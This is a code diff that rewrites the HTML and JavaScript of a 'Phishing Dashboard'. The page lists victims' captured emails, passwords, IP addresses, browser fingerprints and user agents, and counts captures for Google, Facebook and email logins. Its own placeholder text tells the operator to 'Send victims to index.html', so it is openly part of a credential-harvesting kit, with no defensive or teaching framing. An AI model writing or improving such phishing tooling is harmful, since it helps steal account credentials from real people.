@@ -1,1 +1,89 @@
-<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Dashboard</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:system-ui;background:#1a1a2e;padding:20px;color:#fff}.header{background:linear-gradient(135deg,#667eea,#764ba2);padding:30px;border-radius:12px;text-align:center;margin-bottom:30px}.header h1{font-size:28px;margin-bottom:10px}.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;margin-bottom:30px}.stat{background:rgba(255,255,255,.1);padding:20px;border-radius:12px;text-align:center}.stat h3{font-size:32px;font-weight:700;color:#4ade80;margin-bottom:5px}.stat p{color:#cbd5e1}.creds{ background:rgba(255,255,255,.05);border-radius:12px;overflow:hidden}.creds h2{padding:24px 24px 0;background:rgba(255,255,255,.1);margin:0}.list{padding:0 24px 24px;max-height:60vh;overflow:auto}.cred{margin:16px 0;padding:20px;background:rgba(66,133,244,.2);border-radius:12px;border-left:4px solid #4ade80}.cred-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}.cred-id{font-weight:700;color:#4ade80}.cred-time{color:#cbd5e1;font-size:14px}.cred-details{font-family:monospace;background:rgba(0,0,0,.3);padding:12px;border-radius:8px;margin-top:8px}.empty{padding:40px;text-align:center;color:#cbd5e1;font-size:18px}.clear-btn{background:#ef4444;color:#fff;border:none;padding:12px 24px;border-radius:8px;cursor:pointer;font-weight:600;float:right;margin:20px}</style></head><body><div class="header"><h1>🎣 Phishing Dashboard</h1><p>Total Captures: <span id="total">0</span></p></div><div class="stats"><div class="stat"><h3 id="google-count">0</h3><p>Google Logins</p></div><div class="stat"><h3 id="facebook-count">0</h3><p>Facebook Logins</p></div><div class="stat"><h3 id="email-count">0</h3><p>Email Logins</p></div></div><div class="creds"><h2>Captured Credentials<button class="clear-btn" onclick="clearAll()">Clear All</button></h2><div class="list" id="creds-list"><div class="empty">Send your phishing link to start capturing! 📧</div></div></div><script>function loadCaptures(){try{const data=JSON.parse(localStorage.getItem('phish_captures')||'[]');document.getElementById('total').textContent=data.length;const counts={Google:0,Facebook:0,Email:0};data.forEach(c=>{counts[c.type]++});document.getElementById('google-count').textContent=counts.Google;document.getElementById('facebook-count').textContent=counts.Facebook;document.getElementById('email-count').textContent=counts.Email;const list=document.getElementById('creds-list');list.innerHTML='';if(data.length===0){list.innerHTML='<div class="empty">Send your phishing link to start capturing! 📧</div>';return;}data.forEach(cred=>{const div=document.createElement('div');div.className='cred';div.innerHTML=`<div class="cred-header"><span class="cred-id">#${cred.id}</span><span class="cred-time">${cred.time}</span></div><div><strong>${cred.type}:</strong> ${cred.email}</div><div style="color:#f87171;font-family:monospace;font-size:16px;font-weight:700;margin:8px 0">${cred.password}</div><div class="cred-details">${cred.ua}<br>📱 ${cred.screen}</div>`;list.appendChild(div);});}catch(e){console.error(e);}}function clearAll(){if(confirm('Clear all captures?')){localStorage.removeItem('phish_captures');loadCaptures();}}loadCaptures();setInterval(loadCaptures,2000);</script></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phishing Dashboard</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { font-family: 'Segoe UI',Tahoma,Geneva,Verdana,sans-serif; background:#1e1e1e; color:#fff; padding:20px; }
+        .container { max-width:1200px; margin:0 auto; }
+        h1 { color:#00ff88; margin-bottom:20px; text-align:center; }
+        .stats { display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:20px; margin-bottom:30px; }
+        .stat-card { background:linear-gradient(135deg,#667eea 0%,#764ba2 100%); padding:20px; border-radius:12px; text-align:center; }
+        .stat-number { font-size:2.5em; font-weight:bold; color:#00ff88; display:block; }
+        .stat-label { color:#ccc; font-size:0.9em; }
+        table { width:100%; background:#2d2d2d; border-radius:12px; overflow:hidden; box-shadow:0 10px 30px rgba(0,0,0,0.5); }
+        th, td { padding:15px; text-align:left; border-bottom:1px solid #404040; }
+        th { background:#3d3d3d; font-weight:600; color:#00ff88; }
+        tr:hover { background:#363636; }
+        .email { font-weight:bold; color:#4fc3f7; }
+        .password { font-family:monospace; color:#ff6b6b; letter-spacing:1px; }
+        .timestamp { color:#ccc; font-size:0.9em; }
+        .fingerprint { font-family:monospace; font-size:0.8em; color:#888; }
+        .refresh { position:fixed; top:20px; right:20px; background:#00ff88; color:#000; border:none; padding:10px 20px; border-radius:25px; cursor:pointer; font-weight:bold; }
+        .empty { text-align:center; padding:50px; color:#888; font-style:italic; }
+        @media (max-width:768px) { body { padding:10px; } table { font-size:0.9em; } th, td { padding:10px 5px; } }
+    </style>
+</head>
+<body>
+    <button class="refresh" onclick="location.reload()">🔄 Refresh</button>
+    <div class="container">
+        <h1>🎣 Phishing Dashboard</h1>
+        <div class="stats" id="stats"></div>
+        <table id="capturesTable">
+            <thead>
+                <tr>
+                    <th>Email</th>
+                    <th>Password</th>
+                    <th>IP</th>
+                    <th>Time</th>
+                    <th>Fingerprint</th>
+                    <th>User Agent</th>
+                </tr>
+            </thead>
+            <tbody id="tableBody"></tbody>
+        </table>
+    </div>
+
+    <script>
+        function loadCaptures() {
+            const captures = JSON.parse(localStorage.getItem('phishCaptures') || '[]');
+            
+            // Update stats
+            document.getElementById('stats').innerHTML = `
+                <div class="stat-card">
+                    <span class="stat-number">${captures.length}</span>
+                    <span class="stat-label">Total Captures</span>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-number">${new Set(captures.map(c => c.email)).size}</span>
+                    <span class="stat-label">Unique Emails</span>
+                </div>
+                <div class="stat-card">
+                    <span class="stat-number">${Math.max(...captures.map(c => new Date(c.timestamp).getTime())) ? new Date().getMinutes() - new Date(Math.max(...captures.map(c => new Date(c.timestamp).getTime()))).getMinutes() : 0} min</span>
+                    <span class="stat-label">Latest Capture</span>
+                </div>
+            `;
+            
+            // Populate table
+            const tbody = document.getElementById('tableBody');
+            tbody.innerHTML = captures.length ? 
+                captures.map(capture => `
+                    <tr>
+                        <td class="email">${capture.email}</td>
+                        <td class="password">${capture.password}</td>
+                        <td>${capture.ip || 'Detecting...'}</td>
+                        <td class="timestamp">${new Date(capture.timestamp).toLocaleString()}</td>
+                        <td class="fingerprint">${capture.fingerprint.slice(0,30)}...</td>
+                        <td style="font-size:0.8em;">${capture.userAgent.slice(0,50)}...</td>
+                    </tr>
+                `).join('') : '<tr><td colspan="6" class="empty">No captures yet. Send victims to index.html</td></tr>';
+        }
+
+        // Auto-refresh every 5s
+        setInterval(loadCaptures, 5000);
+        loadCaptures();
+    </script>
+</body>
+</html>
